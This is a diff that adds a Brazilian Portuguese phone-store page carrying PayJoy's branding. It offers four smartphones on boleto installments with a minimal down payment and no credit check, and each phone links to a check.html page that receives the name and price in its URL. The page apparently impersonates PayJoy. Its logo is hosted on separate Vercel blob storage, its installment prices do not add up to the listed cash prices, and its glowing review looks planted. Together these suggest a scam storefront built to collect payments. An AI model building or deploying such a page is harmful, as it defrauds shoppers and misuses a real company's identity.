@@ -1,0 +1,318 @@
+<html lang="pt-BR">
+ <head> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <title>Celulares disponíveis</title> 
+  <!-- FAVICON --> 
+  <link rel="icon" type="image/png" href="images.png"> 
+  <link rel="apple-touch-icon" href="images.png"> 
+  <style>
+    body {
+        margin: 0;
+        font-family: Arial, Helvetica, sans-serif;
+        background-color: #f4f4f4;
+    }
+
+    a {
+        text-decoration: none;
+        color: inherit;
+    }
+
+    header {
+        background-color: #0b7a3c;
+        height: 67px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 0 14px;
+    }
+
+    header img {
+        height: 40px;
+    }
+
+    .menu {
+        font-size: 28px;
+        color: #fff;
+    }
+
+    /* BLOCO INFORMATIVO */
+    .info-box {
+        background: #ffffff;
+        border-left: 4px solid #0b7a3c;
+        color: #333;
+        padding: 16px;
+        margin: 10px 12px;
+        border-radius: 8px;
+        font-size: 14px;
+    }
+
+    .info-box strong {
+        color: #0b7a3c;
+    }
+
+    .grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 12px;
+        padding: 12px;
+    }
+
+    .card {
+        background: #fff;
+        border-radius: 12px;
+        padding: 12px;
+        border: 1px solid #e5e5e5;
+    }
+
+    .card img.phone {
+        width: 100%;
+        margin-bottom: 10px;
+    }
+
+    .brand,
+    .model {
+        color: #6b7280;
+        font-size: 14px;
+        font-weight: bold;
+    }
+
+    .price {
+        color: #0b7a3c;
+        font-size: 15px;
+        font-weight: bold;
+        margin-top: 6px;
+    }
+
+    .price span {
+        font-size: 13px;
+        font-weight: normal;
+    }
+
+    .details {
+        font-size: 13px;
+        color: #0b7a3c;
+        margin: 6px 0;
+    }
+
+    .avista {
+        font-size: 13px;
+        color: #333;
+    }
+
+    .frete {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        font-size: 13px;
+        color: #22c55e;
+        margin-top: 6px;
+    }
+
+    .frete img {
+        width: 18px;
+    }
+
+    /* AVALIAÇÕES */
+    .reviews {
+        background: #fff;
+        margin: 12px;
+        padding: 16px;
+        border-radius: 12px;
+        border: 1px solid #e5e5e5;
+    }
+
+    .stars {
+        color: #facc15;
+        font-size: 18px;
+        margin-bottom: 6px;
+    }
+
+    .review-text {
+        font-size: 14px;
+        color: #333;
+        margin-bottom: 8px;
+    }
+
+    .review-author {
+        font-size: 12px;
+        color: #666;
+        margin-bottom: 10px;
+    }
+
+    .more-reviews {
+        display: inline-block;
+        padding: 10px 14px;
+        background-color: #0b7a3c;
+        color: #fff;
+        border-radius: 6px;
+        font-size: 14px;
+    }
+
+    footer {
+        background-color: #0b7a3c;
+        color: #fff;
+        padding: 24px 0;
+        text-align: center;
+        margin-top: 16px;
+    }
+
+    footer .social img {
+        width: 30px;
+        margin: 0 10px;
+    }
+
+    footer span {
+        font-size: 12px;
+        display: block;
+        margin-top: 10px;
+    }
+
+    footer .logo {
+        margin-top: 12px;
+        width: 100px;
+    }
+  </style> 
+ </head> 
+ <body> 
+  <header> 
+   <img src="https://6d1ule7j8zutphez.public.blob.vercel-storage.com/logos/green.svg"> 
+  </header> 
+  <!-- TEXTO INFORMATIVO --> 
+  <div class="info-box">
+    Escolha um dispositivo, simule com 
+   <strong>entrada mínima</strong> e parcele no 
+   <strong>boleto em até 24 vezes</strong>. 
+   <br> 
+   <br> O 
+   <strong>primeiro pagamento</strong> é feito no ato da compra e o 
+   <strong>segundo pagamento</strong> somente no próximo mês. 
+   <br> 
+   <br> Não realizamos consulta no SPC ou Serasa. Em caso de inadimplência, poderão ocorrer cobranças conforme a legislação vigente. 
+  </div> 
+  <div class="grid"> 
+   <!-- CELULAR 1 --> 
+   <a href="check.html?img=01.webp&amp;name=Samsung Galaxy A16 128GB&amp;price=899.00"> 
+    <div class="card"> 
+     <img src="01.webp" class="phone"> 
+     <div class="brand">
+       Samsung 
+     </div> 
+     <div class="model">
+       Galaxy A16 128gb 4gb Ram Câmera 50mp Tela 6.7 Nfc Preto 
+     </div> 
+     <div class="price">
+       A partir de R$240 
+      <span>a cada 1 mês</span> 
+     </div> 
+     <div class="details">
+       Em prazos de 4, 6 ou 9 meses 
+     </div> 
+     <div class="avista">
+       Preço à vista: 
+      <strong>R$ 899,00</strong> 
+     </div> 
+     <div class="frete"> 
+      <img src="https://loja.payjoy.com/_next/static/media/truck.656f1e66.svg"> Frete grátis (até 27 dias) 
+     </div> 
+    </div> </a> 
+   <!-- CELULAR 2 --> 
+   <a href="check.html?img=1.webp&amp;name=Xiaomi Mi 10T 5G 256GB&amp;price=2400.00"> 
+    <div class="card"> 
+     <img src="1.webp" class="phone"> 
+     <div class="brand">
+       Xiaomi 
+     </div> 
+     <div class="model">
+       Xiaomi Mi 10t 5g Dual Sim 256 Gb Preto 12 Gb Ram 
+     </div> 
+     <div class="price">
+       A partir de R$120 
+      <span>a cada 1 mês</span> 
+     </div> 
+     <div class="details">
+       Em prazos de 4, 6 ou 9 meses 
+     </div> 
+     <div class="avista">
+       Preço à vista: 
+      <strong>R$ 2.400,00</strong> 
+     </div> 
+     <div class="frete"> 
+      <img src="https://loja.payjoy.com/_next/static/media/truck.656f1e66.svg"> Frete grátis (até 27 dias) 
+     </div> 
+    </div> </a> 
+   <!-- CELULAR 3 --> 
+   <a href="check.html?img=2.webp&amp;name=Motorola Edge 50 Neo 5G&amp;price=1977.00"> 
+    <div class="card"> 
+     <img src="2.webp" class="phone"> 
+     <div class="brand">
+       Motorola 
+     </div> 
+     <div class="model">
+       Motorola Edge 50 Neo 5g 256GB 8GB RAM 
+     </div> 
+     <div class="price">
+       A partir de R$98 
+      <span>a cada 1 mês</span> 
+     </div> 
+     <div class="details">
+       Em prazos de 4, 6 ou 9 meses 
+     </div> 
+     <div class="avista">
+       Preço à vista: 
+      <strong>R$ 1.977,00</strong> 
+     </div> 
+     <div class="frete"> 
+      <img src="https://loja.payjoy.com/_next/static/media/truck.656f1e66.svg"> Frete grátis (até 27 dias) 
+     </div> 
+    </div> </a> 
+   <!-- CELULAR 4 --> 
+   <a href="check.html?img=4.webp&amp;name=iPhone 16 128GB&amp;price=3476.00"> 
+    <div class="card"> 
+     <img src="4.webp" class="phone"> 
+     <div class="brand">
+       Apple 
+     </div> 
+     <div class="model">
+       iPhone 16 (128 GB) - Preto 
+     </div> 
+     <div class="price">
+       A partir de R$240 
+      <span>a cada 1 mês</span> 
+     </div> 
+     <div class="details">
+       Em prazos de 4, 6 ou 9 meses 
+     </div> 
+     <div class="avista">
+       Preço à vista: 
+      <strong>R$ 3.476,00</strong> 
+     </div> 
+     <div class="frete"> 
+      <img src="https://loja.payjoy.com/_next/static/media/truck.656f1e66.svg"> Frete grátis (até 27 dias) 
+     </div> 
+    </div> </a> 
+  </div> 
+  <!-- AVALIAÇÃO --> 
+  <div class="reviews"> 
+   <div class="stars">
+     ★★★★★ 
+   </div> 
+   <div class="review-text">
+     “Comprei, chegou certinho e consegui parcelar no boleto sem dor de cabeça. Atendimento rápido e processo simples.” 
+   </div> 
+   <div class="review-author">
+     — Carlos S., São Paulo 
+   </div> 
+   <a href="comentarios.html" class="more-reviews"> Ver mais comentários </a> 
+  </div> 
+  <footer> 
+   <div class="social"> 
+    <a href="https://www.facebook.com/PayJoyBR"><img src="https://loja.payjoy.com/_next/static/media/facebook.d9e3595e.svg"></a> 
+    <a href="https://www.instagram.com/payjoy_br/#"><img src="https://loja.payjoy.com/_next/static/media/insta.1972e75b.svg"></a> 
+    <a href="https://www.linkedin.com/company/payjoy/"><img src="https://loja.payjoy.com/_next/static/media/linkedin.48995f84.svg"></a> 
+   </div> 
+   <span>© 2026 PayJoy. Todos os direitos reservados.</span> 
+   <img class="logo" src="https://6d1ule7j8zutphez.public.blob.vercel-storage.com/logos/green.svg"> 
+  </footer> 
+ </body>
+</html>
